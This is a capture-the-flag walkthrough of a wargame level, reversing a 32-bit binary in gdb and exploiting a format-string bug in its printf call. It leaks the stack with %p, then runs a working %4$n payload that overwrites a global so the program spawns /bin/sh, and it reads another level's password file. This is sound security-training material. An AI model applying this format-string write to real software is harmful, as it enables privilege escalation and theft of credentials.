Execute the *level3* binary:

```bash
./level3
abcd
```

```
```

> Note the *level3* binary reads the user input from stdin like the *level1* and *level2*.

```gdb
disass main
```

> Use __set disassembly-flavor intel__ command to set the intel syntax.

```gdb
Dump of assembler code for function main:
   0x0804851a <+0>:	    push   ebp
   0x0804851b <+1>:	    mov    ebp,esp
   0x0804851d <+3>:	    and    esp,0xfffffff0
   0x08048520 <+6>:	    call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
```

Check the *v* function called from the main:

```gdb
disass v
```

```gdb
Dump of assembler code for function v:
...
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>           ; get the user input
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>          ; print the user input
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40                        ; compare the "m" global variable to 64
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
...
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>          ; print "Wait what?!\n"
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>       ; execute "/bin/sh"

   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.
```

> Exploit directly the user input is no longer possible because the *gets* function was remplaced by *fgets* wich limit the length input to prevent overflow.

The goal is to reach the system call instruction that open the shell with the right of the binary.

For reach this instruction, the comparaison of the global variable *m* with the value __64__ need to be equal.

```gdb
x 0x804988c
```

```
0x804988c <m>:	0x00000000
```

> By default, the value of the global variable *m* is 0 (using the __0x804988c__ address).

So it's necessary to set the value of this global variable *m* to __64__.

Note between the user input reading (*fgets*) and the comparaison of the global variable *m*, the call of the *printf* function.

After some search, note the *printf* function can [read and write](https://axcheron.github.io/exploit-101-format-strings/) the stack and specific address using the [%n](https://www.geeksforgeeks.org/g-fact-31/) special format specifier.

```
In C printf(), %n is a special format specifier which instead of printing something causes printf() to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by printf() before the occurrence of %n.
```

Because the string given to *printf* is the user input readed fromt *fgets* in a 512 bytes buffer stored on the stack frame, it's possible to access to the parameters localised on the stack before the *printf* call (and write in with the previous described *%n* special foramt specifier).

```bash
echo "AAAABBBBCCCC %p %p %p %p %p %p %p" | ./level3
```

```
AAAABBBBCCCC 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x42424242 0x43434343 0x20702520
```

> The fourth parameter of the *printf* is the first character of the user input buffer (because AAAA = 0x41414141, BBBB = 0x42424242 ...)

To write in the the global variable *m*:

- Put the address of the global variable *m* at the beginning of the user input (reversed because the stack is readed in the opposite way = \x8c\x98\x04\x08) for the *fgets* call.
- Add 60 padding characters/bytes so that the *%n* special format specifier of *printf* take the value 64 (the four bytes of the global variable *m* plus the 60 paddings bytes).
- Add the *%n* special format specifier with the *%4$...* permutation option for write its value (64) in the fourth parameter of printf which is the start of the user input buffer (starting by the address of the global variable *m* thanks to the step one).

```bash
(echo -e "\x8c\x98\x04\x08............................................................%4\$n" ; cat) | ./level3
cat /home/user/level4/.pass
```

> Use __cat__ to keep stdin open.

```
�............................................................
Wait what?!
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
